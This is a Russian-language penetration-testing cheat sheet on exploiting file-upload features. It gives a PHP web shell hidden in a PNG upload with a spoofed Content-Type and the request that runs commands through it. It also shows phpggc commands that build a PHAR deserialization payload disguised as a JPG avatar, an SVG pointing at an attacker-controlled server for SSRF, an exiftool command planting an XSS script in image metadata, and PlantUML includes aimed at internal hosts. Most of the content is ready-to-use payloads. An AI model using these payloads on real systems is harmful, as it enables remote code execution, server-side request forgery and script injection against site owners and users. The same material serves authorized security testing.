# Example: Upload File

## Upload -> RCE

Веб-приложение может проверять файл только по Content-Type\
Веб-приложение позволяет изменить фото в профиле пользователя, но при этом не проверяет должным образом обновленные изображения, в результате чего вместо загрузки фото можно загрузить php-файл и удаленно исполнить команду на сервере.

Пример: Запрос на загрузку файла: \
`Content-Disposition: form-data; name="file"; filename="image.php"` \
`Content-Type: image/png`\
``\
`%PNG .... IEND .. <?php system($_GET['blabla]); ?> -----------------WebKitFormBoundaryNJKDFNAJCNA`\


В ответ: \
`HTTP/1.1 200 OK`\
``\
`{"path": "/some/path/crooped.php", "error": 0}`

Следующий запрос: \
`GET /some/path/crooped.php?blabla=dir+C:\`

Получаем RCE :)

## Upload PHAR -> RCE

PHAR - это сериализованный или упакованный PHP код?

Проблема с php rce — надо чтобы скрипт заканчивался на .php

Однако, если у нас есть возможность заставить сервак обратиться по схеме phar:// к локальному файлу, который мы контролируем, то это может привести к исполнению кода

Пример: загружаем exploit.jpg, как аватар, который является PHAR-файлом

```
git clone https://github.com/ambionics/phpggc
$ cd ./phpggc
$ wget https://upload.wikimedia.org/wikipedia/en/a/a9/Example.jpg
$ ./phpggc -pj Example.jpg ZendFramework/RCE3 system 'ls -lah' > exploit.jpg
```

Теперь, если есть SSRF, например, то6 при обращении к `phar:///var/www/example.com/data/upload/image/exploit.jpg` исполнится наш код.

## SVG -> SSRF

```markup
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"> 
<image height="30" width="30" 
xlink:href="https://controlledserver.com/pic.svg" /> 
</svg>
```

## XSS Payload -> Image (PNG)

```
exiftool -Comment="\"><script>alert(prompt('Payload for XSS'))</script>" xss_comment_exif_metadata_double_quote.png
```

## UML -> SSRF

UML диаграммы могут поддерживать инклуд других файлов, в том числе с удаленных сервисов

Например:

```
@startuml
!include http://127.0.0.1:80
%load_json('http://localhost')
@enduml
```
